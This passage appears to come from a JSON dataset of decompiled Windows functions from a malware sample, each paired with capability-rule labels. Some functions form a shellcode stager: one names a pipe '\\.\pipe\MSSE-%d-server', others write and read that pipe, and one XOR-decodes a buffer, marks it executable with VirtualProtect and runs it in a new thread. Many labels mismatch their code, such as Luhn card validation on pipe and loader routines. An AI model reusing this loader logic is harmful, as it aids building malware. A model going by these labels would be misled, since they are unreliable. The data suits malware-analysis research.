in_R9 + (uVar18 - piVar16);\n                        *(auStack248 + iVar10) = 0x6bac1ea0;\n                        fcn.6bac1b80(arg1_00, apuStack200, 1);\n                        goto code_r0x6bac1ea0;\n                    }\n                    if (uVar7 != 0x10) goto code_r0x6bac2051;\n                    uVar3 = *arg1_00;\n                    uVar18 = uVar3;\n                    if (uVar3 < 0) {\n                        uVar18 = uVar3 | 0xffffffffffff0000;\n                    }\n                    puVar17 = puVar17 + 3;\n                    apuStack200[0] = in_R9 + (uVar18 - piVar16);\n                    *(auStack248 + iVar10) = 0x6bac1f11;\n                    fcn.6bac1b80(arg1_00, apuStack200, 2);\n                } while (puVar17 < puVar1);\n                goto code_r0x6bac1f20;\n            }\n        }\n    }\n    else if (uVar7 == 0) {\n        ppuVar9 = (*0x6bb07240)[1];\n        if (((*0x6bb07240)[1] | (*0x6bb07240)[2]) == 0) {\n            uVar7 = (*0x6bb07240)[3];\n            puVar17 = *0x6bb07240 + 3;\n            goto code_r0x6bac1e2d;\n        }\n        goto code_r0x6bac1e38;\n    }\n    if (*0x6bb07230 <= puVar17) {\n        *0x6bb0a5e4 = 0;\n        return ppuVar9;\n    }\n    puVar1 = puVar17 + (*0x6bb07230 + (-1 - puVar17) & 0xfffffffffffffff8U) + 8;\n    do {\n        uVar7 = puVar17[1];\n        uVar8 = *puVar17;\n        puVar17 = puVar17 + 2;\n        apuStack200[0] = apuStack200[0] & 0xffffffff00000000 | uVar8 + *(uVar7 + iVar12);\n        *(auStack248 + iVar10) = 0x6bac2047;\n        fcn.6bac1b80(uVar7 + iVar12, apuStack200, 4);\n    } while (puVar17 != puVar1);\ncode_r0x6bac1f20:\n    pcVar13 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    ppuVar9 = *0x6bb0a5e4;\n    if (0 < *0x6bb0a5e4) {\n        iVar12 = 0;\n        do {\n            ppuVar9 = *0x6bb0a5e8 + iVar12;\n            iVar4 = *ppuVar9;\n            if (iVar4 != 0) {\n                puVar5 = ppuVar9[2];\n                puVar6 = ppuVar9[1];\n                *(auStack248 + iVar10) = 0x6bac1f60;\n                ppuVar9 = (*pcVar13)(puVar6, puVar5, iVar4, apuStack200);\n            }\n            iVar14 = iVar14 + 1;\n            iVar12 = iVar12 + 0x28;\n        } while (iVar14 < *0x6bb0a5e4);\n    }\n    return ppuVar9;\n}\n",
        "token_count": 4067
    },
    "6bac1598": {
        "rules": [
            "delay execution",
            "delay execution"
        ],
        "decompiled_code": "\nulong fcn.6bac1598(void)\n\n{\n    int64_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ulong arg1;\n    uint64_t uVar4;\n    uint uVar5;\n    ulong in_stack_ffffffffffffffc0;\n    uint uVar6;\n    ulong in_stack_ffffffffffffffe8;\n    uint32_t uVar7;\n    ulong in_stack_fffffffffffffff0;\n    \n    uVar7 = in_stack_fffffffffffffff0 >> 0x20;\n    uVar5 = in_stack_ffffffffffffffc0 >> 0x20;\n    uVar6 = in_stack_ffffffffffffffe8 >> 0x20;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    sub.msvcrt.dll_sprintf\n              (0x6bb0a920, \"%c%c%c%c%c%c%c%c%cMSSE-%d-server\", 0x5c, 0x5c, 0x2e, CONCAT44(uVar5, 0x5c), 0x70, 0x69, 0x70\n               , 0x65, CONCAT44(uVar6, 0x5c), (uVar4 & 0xffffffff) % 0x26aa | uVar7 << 0x20);\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x6bac1486, 0, 0, 0);\n    iVar1 = *0x6bb072e0;\n    arg1 = sub.msvcrt.dll_malloc(*(*0x6bb072e0 + 4));\n    pcVar2 = _sym.imp.KERNEL32.dll_Sleep;\n    do {\n        (*pcVar2)(0x400);\n        iVar3 = fcn.6bac14a4(arg1, *(iVar1 + 4));\n    } while (iVar3 == 0);\n    fcn.6bac16f5(arg1, *(iVar1 + 4), iVar1 + 8);\n    return 0;\n}\n",
        "token_count": 450
    },
    "6bac13d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.6bac13d0(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    uint64_t in_stack_ffffffffffffffa8;\n    uint32_t auStack44 [3];\n    \n    auStack44[0] = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateNamedPipeA)\n                      (0x6bb0a920, 2, 0, 1, in_stack_ffffffffffffffa8 & 0xffffffff00000000, 0, 0, 0);\n    if (iVar2 - 1U < 0xfffffffffffffffe) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_ConnectNamedPipe)(iVar2, 0);\n        if (iVar1 != 0) {\n            for (; 0 < arg2; arg2._0_4_ = arg2 - auStack44[0]) {\n                iVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, arg1, arg2, auStack44, 0);\n                if (iVar1 == 0) break;\n                arg1 = arg1 + auStack44[0];\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 286
    },
    "6bac14a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.6bac14a4(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    uint32_t auStack44 [3];\n    \n    auStack44[0] = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x6bb0a920, 0x80000000, 3, 0, 3, 0x80, 0);\n    uVar3 = 0;\n    if (iVar2 != -1) {\n        for (; 0 < arg2; arg2._0_4_ = arg2 - auStack44[0]) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(iVar2, arg1, arg2, auStack44, 0);\n            if (iVar1 == 0) break;\n            arg1 = arg1 + auStack44[0];\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        uVar3 = 1;\n    }\n    return uVar3;\n}\n",
        "token_count": 245
    },
    "6bac16f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create thread",
            "allocate memory"
        ],
        "decompiled_code": "\nvoid fcn.6bac16f5(int64_t arg1, ulong dwSize, int64_t arg3)\n\n{\n    int64_t arg1_00;\n    int64_t iVar1;\n    \n    arg1_00 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, dwSize, 0x3000, 4);\n    for (iVar1 = 0; iVar1 < dwSize; iVar1 = iVar1 + 1) {\n        *(arg1_00 + iVar1) = *(arg3 + (iVar1 & 3)) ^ *(arg1 + iVar1);\n    }\n    fcn.6bac16c3(arg1_00);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n    (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x6bac16c0, arg1_00, 0, 0);\n    return;\n}\n",
        "token_count": 201
    },
    "6bac2240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.6bac2240(void)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int32_t *piVar4;\n    ulong *puVar5;\n    uchar *puVar6;\n    uint64_t uVar7;\n    \n    iVar2 = fcn.6bac29b0();\n    iVar1 = *0x6bb0a608;\n    if ((*0x6bb0a608 == 0) && (iVar2 != 0)) {\n        *0x6bb0a608 = 1;\n        iVar3 = fcn.6bac27e0(\".pdata\");\n        if (iVar3 == 0) {\n            uVar7 = 0;\n            puVar5 = 0x6bb0a720;\n            for (iVar3 = 0x30; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            puVar5 = 0x6bb0a620;\n            for (iVar3 = 0x20; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = 0;\n                puVar5 = puVar5 + 1;\n            }\n            piVar4 = 0x6bb0a720;\n            puVar6 = 0x6bb0a620;\n            do {\n                iVar3 = fcn.6bac2940(uVar7);\n                if (iVar3 == 0) {\n                    if (uVar7 == 0) goto code_r0x6bac227c;\n                    uVar7 = uVar7 & 0xffffffff;\n                    goto code_r0x6bac2325;\n                }\n                *puVar6 = 9;\n                uVar7 = uVar7 + 1;\n                *(puVar6 + 4) = 0x6bac2080 - iVar2;\n                iVar1 = *(iVar3 + 0xc);\n                *piVar4 = iVar1;\n                piVar4[1] = iVar1 + *(iVar3 + 8);\n                piVar4[2] = puVar6 - iVar2;\n                piVar4 = piVar4 + 3;\n                puVar6 = puVar6 + 8;\n            } while (uVar7 != 0x20);\n            uVar7 = 0x20;\ncode_r0x6bac2325:\n            (*_sym.imp.KERNEL32.dll_RtlAddFunctionTable)(0x6bb0a720, uVar7, iVar2);\n        }\ncode_r0x6bac227c:\n        iVar1 = 1;\n    }\n    return iVar1;\n}\n",
        "token_count": 600
    },
    "6bac24f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.6bac24f0(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x6bb0a8c0);\n    pcVar3 = _sym.imp.KERNEL32.dll_TlsGetValue;\n    pcVar2 = _sym.imp.KERNEL32.dll_GetLastError;\n    for (puVar1 = *0x6bb0a8a0; puVar1 != NULL; puVar1 = *(puVar1 + 4)) {\n        iVar5 = (*pcVar3)(*puVar1);\n        iVar4 = (*pcVar2)();\n        if ((iVar4 == 0) && (iVar5 != 0)) {\n            (**(puVar1 + 2))();\n        }\n    }\n    // WARNING: Could not recover jumptable at 0x6bac2554. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x6bb0a8c0);\n    return;\n}\n",
        "token_count": 255
    },
    "6bac27e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.6bac27e0(ulong arg1)\n\n{\n    int64_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    int16_t *piVar5;\n    int64_t iVar6;\n    \n    uVar4 = sub.msvcrt.dll_strlen();\n    if (8 < uVar4) {\n        return 0;\n    }\n    if ((**0x6bb07260 == 0x5a4d) && (piVar5 = *0x6bb07260,  iVar3 = fcn.6bac2750(*0x6bb07260),  iVar3 != 0)) {\n        iVar3 = *(piVar5 + 0x1e);\n        iVar6 = piVar5 + *(piVar5 + iVar3 + 0x14) + iVar3 + 0x18;\n        uVar2 = *(piVar5 + iVar3 + 6);\n        if (uVar2 == 0) {\n            return 0;\n        }\n        iVar1 = iVar6 + 0x28;\n        do {\n            iVar3 = sub.msvcrt.dll_strncmp(iVar6, arg1, 8);\n            if (iVar3 == 0) {\n                return iVar6;\n            }\n            iVar6 = iVar6 + 0x28;\n        } while (iVar6 != iVar1 + (uVar2 - 1) * 0x28);\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 335
    },
    "6bac2880": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.6bac2880(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int16_t *piVar5;\n    \n    iVar4 = 0;\n    if ((**0x6bb07260 == 0x5a4d) && (piVar5 = *0x6bb07260,  iVar3 = fcn.6bac2750(*0x6bb07260),  iVar3 != 0)) {\n        iVar3 = *(piVar5 + 0x1e);\n        iVar4 = piVar5 + *(piVar5 + iVar3 + 0x14) + iVar3 + 0x18;\n        uVar2 = *(piVar5 + iVar3 + 6);\n        if (uVar2 != 0) {\n            iVar1 = iVar4 + 0x28;\n            do {\n                if ((*(iVar4 + 0xc) <= arg1 - piVar5) && (arg1 - piVar5 < *(iVar4 + 0xc) + *(iVar4 + 8))) {\n                    return iVar4;\n                }\n                iVar4 = iVar4 + 0x28;\n            } while (iVar4 != iVar1 + (uVar2 - 1) * 0x28);\n        }\n        iVar4 = 0;\n    }\n    return iVar4;\n}\n",
        "token_count": 316
    },
    "6bac2910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.6bac2910(void)\n\n{\n    uint64_t uVar1;\n    int16_t *piVar2;\n    \n    uVar1 = 0;\n    if (**0x6bb07260 == 0x5a4d) {\n        piVar2 = *0x6bb07260;\n        uVar1 = fcn.6bac2750(*0x6bb07260);\n        if (uVar1 != 0) {\n            uVar1 = *(*(piVar2 + 0x1e) + 6 + piVar2);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 139
    },
    "6bac2940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint64_t fcn.6bac2940(int64_t arg1)\n\n{\n    int64_t iVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int16_t *piVar4;\n    int64_t iVar5;\n    \n    iVar5 = 0;\n    if ((**0x6bb07260 == 0x5a4d) && (piVar4 = *0x6bb07260,  iVar3 = fcn.6bac2750(*0x6bb07260),  iVar3 != 0)) {\n        iVar3 = *(piVar4 + 0x1e);\n        iVar5 = piVar4 + *(piVar4 + iVar3 + 0x14) + iVar3 + 0x18;\n        uVar2 = *(piVar4 + iVar3 + 6);\n        if (uVar2 != 0) {\n            iVar1 = iVar5 + 0x28;\n            do {\n                if ((*(iVar5 + 0x27) & 0x20) != 0) {\n                    if (arg1 == 0) {\n                        return iVar5;\n                    }\n                    arg1 = arg1 + -1;\n                }\n                iVar5 = iVar5 + 0x28;\n            } while (iVar5 != iVar1 + (uVar2 - 1) * 0x28);\n        }\n        iVar5 = 0;\n    }\n    return iVar5;\n}\n",
        "token_count": 316
    },
    "6bac29b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * fcn.6bac29b0(void)\n\n{\n    int32_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    \n    piVar3 = NULL;\n    if (**0x6bb07260 == 0x5a4d) {\n        piVar2 = *0x6bb07260;\n        iVar1 = fcn.6bac2750(*0x6bb07260);\n        if (iVar1 != 0) {\n            piVar3 = piVar2;\n        }\n    }\n    return piVar3;\n}\n",
        "token_count": 130
    },
    "6bac2d00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.6bac2d00(uint64_t *arg1)\n\n{\n    code **ppcVar1;\n    code **ppcVar2;\n    \n    sub.msvcrt.dll__lock(8);\n    ppcVar1 = *arg1;\n    ppcVar2 = arg1[1];\n    arg1[2] = 0;\n    arg1[1] = 0;\n    *arg1 = 0;\n    sub.msvcrt.dll__unlock(8);\n    if (ppcVar1 != NULL) {\n        while (ppcVar2 = ppcVar2 + -1,  ppcVar1 <= ppcVar2) {\n            while (*ppcVar2 != NULL) {\n                (**ppcVar2)();\n                ppcVar2 = ppcVar2 + -1;\n                if (ppcVar2 < ppcVar1) goto code_r0x6bac2d5e;\n            }\n        }\ncode_r0x6bac2d5e:\n        sub.msvcrt.dll_free(ppcVar1);\n    }\n    return 0;\n}\n",
        "token_count": 237
    },
    "6bac2d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.6bac2d80(uint64_t arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll___iob_func();\n    return iVar1 + (arg1 & 0xffffffff) * 0x30;\n}\n",
        "token_count": 61
    },
    "6bac2b40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint64_t fcn.6bac2b40(ulong arg1)\n\n{\n    uint64_t in_RAX;\n    uint64_t uVar1;\n    ulong *puVar2;\n    ulong auStackX8 [4];\n    uint64_t uStack16;\n    \n    puVar2 = auStackX8;\n    uVar1 = in_RAX;\n    if (0xfff < in_RAX) {\n        do {\n            puVar2 = puVar2 + -0x200;\n            *puVar2 = *puVar2;\n            uVar1 = uVar1 - 0x1000;\n        } while (0x1000 < uVar1);\n    }\n    uStack16 = in_RAX;\n    *(puVar2 - uVar1) = *(puVar2 - uVar1);\n    return uStack16;\n}\n",
        "token_count": 183
    },
    "6bac1b10": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nuint8_t ** fcn.6bac1b10(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int64_t iVar9;\n    uint8_t **ppuVar10;\n    int64_t iVar11;\n    uint *puVar12;\n    int64_t iVar13;\n    uint64_t uVar14;\n    code *pcVar15;\n    int32_t iVar16;\n    char *pcVar17;\n    int64_t *arg1_00;\n    uint64_t arg2_00;\n    int64_t *piVar18;\n    uint32_t *puVar19;\n    ulong *arg3_00;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    ulong auStack360 [5];\n    ulong auStack320 [5];\n    uchar auStack280 [8];\n    uchar *apuStack272 [2];\n    ulong *puStack256;\n    ulong *puStack248;\n    int64_t iStack240;\n    ulong *puStack232;\n    ulong auStack160 [3];\n    ulong uStack136;\n    uint32_t uStack124;\n    ulong *puStack112;\n    \n    puStack112 = &uStackX16;\n    uStackX16 = arg2;\n    uStackX24 = arg3;\n    uStackX32 = arg4;\n    iVar9 = fcn.6bac2d80(2);\n    sub.msvcrt.dll_fwrite(\"Mingw-w64 runtime failure:\\n\", 1, 0x1b);\n    puStack232 = fcn.6bac2d80(2);\n    puStack256 = puStack112;\n    sub.msvcrt.dll_vfprintf();\n    sub.msvcrt.dll_abort();\n    iStack240 = *0x6bb0a5e4;\n    arg3_00 = puStack256;\n    if (*0x6bb0a5e4 < 1) goto code_r0x6bac1d28;\n    iVar16 = 0;\n    ppuVar10 = *0x6bb0a5e8 + 0x18;\n    do {\n        if ((*ppuVar10 <= puStack232) && (arg3_00 = *(ppuVar10[1] + 8),  puStack232 < *ppuVar10 + arg3_00))\n        goto code_r0x6bac1c57;\n        iVar16 = iVar16 + 1;\n        ppuVar10 = ppuVar10 + 5;\n    } while (iVar16 != *0x6bb0a5e4);\n    while (iVar11 = fcn.6bac2880(puStack232),  iVar11 != 0) {\n        iStack240 = iStack240 * 0x28;\n        puVar12 = *0x6bb0a5e8 + iStack240;\n        *(puVar12 + 8) = iVar11;\n        *puVar12 = 0;\n        iVar13 = fcn.6bac29b0();\n        iVar13 = *(iVar11 + 0xc) + iVar13;\n        *(*0x6bb0a5e8 + iStack240 + 0x18) = iVar13;\n        iVar13 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(iVar13, auStack160, 0x30);\n        if (iVar13 == 0) goto code_r0x6bac1d71;\n        ppuVar10 = uStack124;\n        if (((uStack124 - 0x40 & 0xffffffbf) == 0) ||\n           (uVar7 = uStack124 - 4 & 0xfffffffb,  ppuVar10 = uVar7,  uVar7 == 0)) {\ncode_r0x6bac1c50:\n            *0x6bb0a5e4 = *0x6bb0a5e4 + 1;\ncode_r0x6bac1c57:\n            uVar7 = puStack256;\n            if (uVar7 < 8) {\n                if ((puStack256 & 4) == 0) {\n                    if (uVar7 != 0) {\n                        ppuVar10 = *arg1;\n                        *puStack232 = *arg1;\n                        if ((puStack256 & 2) != 0) {\n                            uVar3 = *(arg1 + ((puStack256 & 0xffffffff) - 2));\n                            ppuVar10 = uVar3;\n                            *(puStack232 + ((puStack256 & 0xffffffff) - 2)) = uVar3;\n                        }\n                    }\n                }\n                else {\n                    *puStack232 = *arg1;\n                    uVar7 = *(arg1 + ((puStack256 & 0xffffffff) - 4));\n                    ppuVar10 = uVar7;\n                    *(puStack232 + ((puStack256 & 0xffffffff) - 4)) = uVar7;\n                }\n            }\n            else {\n                *puStack232 = *arg1;\n                ppuVar10 = puStack256 & 0xffffffff;\n                *(puStack232 + -1 + ppuVar10) = *(arg1 + -1 + ppuVar10);\n                iVar9 = puStack232 - (puStack232 + 1 & 0xfffffffffffffff8);\n                uVar7 = uVar7 + iVar9 & 0xfffffff8;\n                if (7 < uVar7) {\n                    ppuVar10 = NULL;\n                    do {\n                        uVar8 = ppuVar10 + 8;\n                        *((puStack232 + 1 & 0xfffffffffffffff8) + ppuVar10) = *((arg1 - iVar9) + ppuVar10);\n                        ppuVar10 = uVar8;\n                    } while (uVar8 < uVar7);\n                    return uVar8;\n                }\n            }\n            return ppuVar10;\n        }\n        arg3_00 = 0x40;\n        iVar9 = *0x6bb0a5e8 + iStack240;\n        *(iVar9 + 8) = auStack160[0];\n        *(iVar9 + 0x10) = uStack136;\n        ppuVar10 = (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n        if (ppuVar10 != 0) goto code_r0x6bac1c50;\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.6bac1b10(\"  VirtualProtect failed with code 0x%x\", uVar7, arg3_00, iVar9);\ncode_r0x6bac1d28:\n        iStack240 = 0;\n    }\n    fcn.6bac1b10(\"Address %p has no image-section\", puStack232, arg3_00, iVar9);\ncode_r0x6bac1d71:\n    pcVar17 = \"  VirtualQuery failed for %d bytes at address %p\";\n    uVar14 = *(*0x6bb0a5e8 + iStack240 + 0x18);\n    ppuVar10 = fcn.6bac1b10(\"  VirtualQuery failed for %d bytes at address %p\", *(iVar11 + 8), uVar14, iVar9);\n    iVar16 = *0x6bb0a5e0;\n    if (*0x6bb0a5e0 != 0) {\n        return ppuVar10;\n    }\n    *0x6bb0a5e0 = 1;\n    auStack320[0] = 0x6bac1dd7;\n    puStack248 = arg1;\n    fcn.6bac2910();\n    auStack320[0] = 0x6bac1dee;\n    iVar11 = fcn.6bac2b40(pcVar17);\n    iVar13 = *0x6bb07260;\n    puVar1 = *0x6bb07230;\n    *0x6bb0a5e4 = 0;\n    iVar11 = -iVar11;\n    *0x6bb0a5e8 = auStack280 + iVar11;\n    ppuVar10 = *0x6bb07230 - *0x6bb07240;\n    if (ppuVar10 < 8) {\n        *0x6bb0a5e4 = 0;\n        return ppuVar10;\n    }\n    uVar7 = **0x6bb07240;\n    puVar19 = *0x6bb07240;\n    if (ppuVar10 < 0xc) {\ncode_r0x6bac1e2d:\n        if (uVar7 == 0) {\n            ppuVar10 = puVar19[1];\ncode_r0x6bac1e38:\n            if (ppuVar10 == 0) {\n                arg2_00 = puVar19[2];\n                if (puVar19[2] != 1) {\ncode_r0x6bac2068:\n                    pcVar17 = \"  Unknown pseudo relocation protocol version %d.\\n\";\n                    *(auStack320 + iVar11) = 0x6bac2074;\n                    fcn.6bac1b10(\"  Unknown pseudo relocation protocol version %d.\\n\", arg2_00, uVar14, iVar9);\n                    uVar7 = *pcVar17;\n                    if (0xc0000096 < uVar7) {\n                        return 0x1;\n                    }\n                    if (0xc000008b < uVar7) {\n                        switch(uVar7) {\n                        case 0xc000008d:\n                        case 0xc000008e:\n                        case 0xc000008f:\n                        case 0xc0000090:\n                        case 0xc0000091:\n                        case 0xc0000093:\n                            *(auStack360 + iVar11) = 0x6bac20be;\n                            pcVar15 = sub.msvcrt.dll_signal(8, 0);\n                            if (pcVar15 != 0x1) goto code_r0x6bac216d;\n                            *(auStack360 + iVar11) = 0x6bac20d7;\n                            sub.msvcrt.dll_signal(8, 1);\n                            *(auStack360 + iVar11) = 0x6bac20dc;\n                            fcn.6bac2b30();\n                        default:\n                            return NULL;\n                        case 0xc0000094:\n                            *(auStack360 + iVar11) = 0x6bac2163;\n                            pcVar15 = sub.msvcrt.dll_signal(8, 0);\n                            if (pcVar15 == 0x1) {\n                                *(auStack360 + iVar11) = 0x6bac220f;\n                                sub.msvcrt.dll_signal(8, 1);\n                                return NULL;\n                            }\ncode_r0x6bac216d:\n                            if (pcVar15 != NULL) {\n                                *(auStack360 + iVar11) = 0x6bac2183;\n                                (*pcVar15)(8);\n                                return NULL;\n                            }\n                            return 0x1;\n                        case 0xc0000096:\n                            goto code_r0x6bac2112;\n                        }\n                    }\n                    if (uVar7 == 0xc0000005) {\n                        *(auStack360 + iVar11) = 0x6bac219c;\n                        pcVar15 = sub.msvcrt.dll_signal(0xb, 0);\n                        if (pcVar15 == 0x1) {\n                            *(auStack360 + iVar11) = 0x6bac222f;\n                            sub.msvcrt.dll_signal(0xb, 1);\n                            return NULL;\n                        }\n                        if (pcVar15 != NULL) {\n                            *(auStack360 + iVar11) = 0x6bac21ae;\n                            (*pcVar15)(0xb);\n                            return NULL;\n                        }\n                    }\n                    else {\n                        if (uVar7 < 0xc0000006) {\n                            return uVar7 != 0x80000002;\n                        }\n                        if (uVar7 == 0xc0000008) {\n                            return NULL;\n                        }\n                        if (uVar7 != 0xc000001d) {\n                            return 0x1;\n                        }\ncode_r0x6bac2112:\n                        *(auStack360 + iVar11) = 0x6bac211e;\n                        pcVar15 = sub.msvcrt.dll_signal(4, 0);\n                        if (pcVar15 == 0x1) {\n                            *(auStack360 + iVar11) = 0x6bac21ef;\n                            sub.msvcrt.dll_signal(4, 1);\n                            return NULL;\n                        }\n                        if (pcVar15 != NULL) {\n                            *(auStack360 + iVar11) = 0x6bac2138;\n                            (*pcVar15)(4);\n                            return NULL;\n                        }\n                    }\n                    return 0x4;\n                }\n                puVar19 = puVar19 + 3;\n                if (*0x6bb07230 <= puVar19) {\n                    *0x6bb0a5e4 = 0;\n                    return ppuVar10;\n                }\n                do {\n                    while( true ) {\n                        uVar2 = *(puVar19 + 2);\n                        uVar14 = uVar2;\n                        piVar18 = *puVar19 + iVar13;\n                        arg1_00 = puVar19[1] + iVar13;\n                        iVar9 = *piVar18;\n                        if (uVar2 != 0x20) break;\n                        uVar7 = *arg1_00;\n                        uVar14 = uVar7 | 0xffffffff00000000;\n                        if (-1 < uVar7) {\n                            uVar14 = uVar7;\n                        }\n                        apuStack272[0] = iVar9 + (uVar14 - piVar18);\n                        *(auStack320 + iVar11) = 0x6bac1ffa;\n                        fcn.6bac1b80(arg1_00, apuStack272, 4);\ncode_r0x6bac1ea0:\n                        puVar19 = puVar19 + 3;\n                        if (puVar1 <= puVar19) goto code_r0x6bac1f20;\n                    }\n                    uVar7 = uVar2;\n                    if (0x20 < uVar2) {\n                        if (uVar7 == 0x40) {\n                            apuStack272[0] = iVar9 + (*arg1_00 - piVar18);\n                            *(auStack320 + iVar11) = 0x6bac1fc8;\n                            fcn.6bac1b80(arg1_00, apuStack272, 8);\n                            goto code_r0x6bac1ea0;\n                        }\ncode_r0x6bac2051:\n                        arg2_00 = uVar7;\n                        apuStack272[0] = NULL;\n                        *(auStack320 + iVar11) = 0x6bac2068;\n                        fcn.6bac1b10(\"  Unknown pseudo relocation bit size %d.\\n\", arg2_00, uVar14, iVar9);\n                        goto code_r0x6bac2068;\n                    }\n                    if (uVar7 == 8) {\n                        uVar2 = *arg1_00;\n                        uVar14 = uVar2;\n                        if (uVar2 < '\\0') {\n                            uVar14 = uVar2 | 0xffffffffffffff00;\n                        }\n                        apuStack272[0] = iVar9 + (uVar14 - piVar18);\n                        *(auStack320 + iVar11) = 0x6bac1ea0;\n                        fcn.6bac1b80(arg1_00, apuStack272, 1);\n                        goto code_r0x6bac1ea0;\n                    }\n                    if (uVar7 != 0x10) goto code_r0x6bac2051;\n                    uVar3 = *arg1_00;\n                    uVar14 = uVar3;\n                    if (uVar3 < 0) {\n                        uVar14 = uVar3 | 0xffffffffffff0000;\n                    }\n                    puVar19 = puVar19 + 3;\n                    apuStack272[0] = iVar9 + (uVar14 - piVar18);\n                    *(auStack320 + iVar11) = 0x6bac1f11;\n                    fcn.6bac1b80(arg1_00, apuStack272, 2);\n                } while (puVar19 < puVar1);\n                goto code_r0x6bac1f20;\n            }\n        }\n    }\n    else if (uVar7 == 0) {\n        ppuVar10 = (*0x6bb07240)[1];\n        if (((*0x6bb07240)[1] | (*0x6bb07240)[2]) == 0) {\n            uVar7 = (*0x6bb07240)[3];\n            puVar19 = *0x6bb07240 + 3;\n            goto code_r0x6bac1e2d;\n        }\n        goto code_r0x6bac1e38;\n    }\n    if (*0x6bb07230 <= puVar19) {\n        *0x6bb0a5e4 = 0;\n        return ppuVar10;\n    }\n    puVar1 = puVar19 + (*0x6bb07230 + (-1 - puVar19) & 0xfffffffffffffff8U) + 8;\n    do {\n        uVar7 = puVar19[1];\n        uVar8 = *puVar19;\n        puVar19 = puVar19 + 2;\n        apuStack272[0] = apuStack272[0] & 0xffffffff00000000 | uVar8 + *(uVar7 + iVar13);\n        *(auStack320 + iVar11) = 0x6bac2047;\n        fcn.6bac1b80(uVar7 + iVar13, apuStack272, 4);\n    } while (puVar19 != 